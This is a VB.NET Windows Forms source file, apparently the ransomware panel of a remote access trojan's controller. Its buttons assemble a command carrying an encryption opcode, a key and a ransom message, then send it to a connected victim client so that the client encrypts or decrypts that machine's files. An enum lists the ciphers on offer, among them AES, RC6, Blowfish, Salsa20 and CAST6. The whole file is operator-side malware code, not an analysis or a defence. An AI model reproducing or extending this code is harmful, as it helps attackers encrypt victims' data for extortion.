Public Class Rans_Form
    Private Async Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

        Dim o As String = Form1.PL_RNSW & "|SP1|" & "" & "|SP2|" & Algo_Op.AES_ENC & "|SP2|" & TextBox1.Text & "|SP2|" & TextBox2.Text & "|ENDING|"

        Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))

    End Sub

    Private Async Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click

        Dim o As String = Form1.PL_RNSW & "|SP1|" & "" & "|SP2|" & Algo_Op.AES_DEC & "|SP2|" & TextBox1.Text & "|ENDING|"

        Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))

    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        Application.ExitThread()
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Me.WindowState = FormWindowState.Normal
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        Me.WindowState = FormWindowState.Maximized
    End Sub

    Public Enum Algo_Op

        AES_DEC = 0
        AES_ENC = 1


        RC6_ENC = 2
        RC6_DEC = 3


        BLOW_ENC = 4
        BLOW_DEC = 5

        TWO_ENC = 6
        TWO_DEC = 7

        SALSA20_ENC = 8
        SALSA20_DEC = 9

        CAST6_ENC = 10
        CAST6_DEC = 11

    End Enum
End Class